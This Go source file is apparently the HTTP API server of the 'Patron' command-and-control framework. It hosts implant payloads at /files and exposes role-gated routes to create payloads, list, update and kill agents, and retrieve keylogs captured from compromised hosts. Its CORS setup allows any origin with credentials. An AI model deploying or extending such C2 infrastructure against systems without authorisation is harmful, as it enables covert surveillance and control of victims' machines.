package main

import (
    "net/http"
    "path/filepath"
    "os"
    "strings"
    "time"
    "fmt"

    "github.com/PatronC2/Patron/api/api"
    "github.com/PatronC2/Patron/data"
    "github.com/gin-gonic/gin"
)

func main() {
    api.InitAuth()
    // For regular patron functions
    data.OpenDatabase()
    // admin api functions
    api.OpenDatabase()
    data.InitDatabase()
    api.CreateAdminUser()
    
    gin.SetMode(gin.ReleaseMode)
    r := gin.Default()

    // Apply CORS middleware
    r.Use(CORS())

    // host payloads server
    workDir, _ := os.Getwd()
    filesDir := http.Dir(filepath.Join(workDir, "agents"))
    FileServer(r, "/files", filesDir)

    // handle logins
    r.POST("/login", api.LoginHandler)

    readRoles := []string{"admin", "operator", "readOnly"}
    writeRoles := []string{"admin", "operator"}
    adminRoles := []string{"admin"}

    // Admin functions
    r.POST("/api/admin/users", api.Auth(adminRoles), api.CreateUserHandler)
    r.DELETE("/api/admin/users/:username", api.Auth(adminRoles), api.DeleteUserByUsernameHandler)

    // POST / DELETE requests to non-admin areas use Auth(writeRoles)
    r.POST("/api/updateagent/:agt", api.Auth(writeRoles), api.UpdateAgentHandler)
    r.GET("/api/deleteagent/:agt", api.Auth(writeRoles), api.KillAgentHandler)
    r.POST("/api/payload", api.Auth(writeRoles), api.CreatePayloadHandler)

    // GET requests to non-admin areas use Auth(readRoles)
    r.GET("/api/agents", api.Auth(readRoles), api.GetAgentsHandler)
    r.GET("/api/groupagents", api.Auth(readRoles), api.GetGroupAgents)
    r.GET("/api/groupagents/:ip", api.Auth(readRoles), api.GetGroupAgentsByIP)
    r.GET("/api/oneagent/:agt", api.Auth(readRoles), api.GetOneAgentByUUID)
    r.GET("/api/agent/:agt", api.Auth(readRoles), api.GetAgentByUUID)
    r.GET("/api/keylog/:agt", api.Auth(readRoles), api.GetKeylogHandler)
    r.GET("/api/payloads", api.Auth(readRoles), api.GetPayloadsHandler)

    // Logging
    r.Use(func(c *gin.Context) {
        c.Next()
        status := c.Writer.Status()
        method := c.Request.Method
        path := c.Request.URL.Path
        clientIP := c.ClientIP()
        c.Writer.Header().Set("X-Server-Timestamp", time.Now().Format(time.RFC3339))
        fmt.Printf("[%d] %s %s %s", status, method, path, clientIP)
    })

    // Start server
    r.Run(":8000")
}

func FileServer(r *gin.Engine, path string, root http.FileSystem) {
    if strings.ContainsAny(path, "{}*") {
        panic("FileServer does not permit any URL parameters.")
    }

    if path != "/" && path[len(path)-1] != '/' {
        r.GET(path, func(c *gin.Context) {
            c.Redirect(http.StatusMovedPermanently, path+"/")
        })
        path += "/"
    }
    r.StaticFS(path, root)
}

func CORS() gin.HandlerFunc {
    return func(c *gin.Context) {
        c.Writer.Header().Set("Access-Control-Allow-Origin", "*")
        c.Writer.Header().Set("Access-Control-Allow-Credentials", "true")
        c.Writer.Header().Set("Access-Control-Allow-Headers", "Content-Type, Content-Length, Accept-Encoding, X-CSRF-Token, Authorization, accept, origin, Cache-Control, X-Requested-With")
        c.Writer.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS, GET, PUT, DELETE")

        if c.Request.Method == "OPTIONS" {
            c.Writer.Header().Set("Access-Control-Max-Age", "86400")
            c.AbortWithStatus(204)
            return
        }

        c.Next()
    }
}

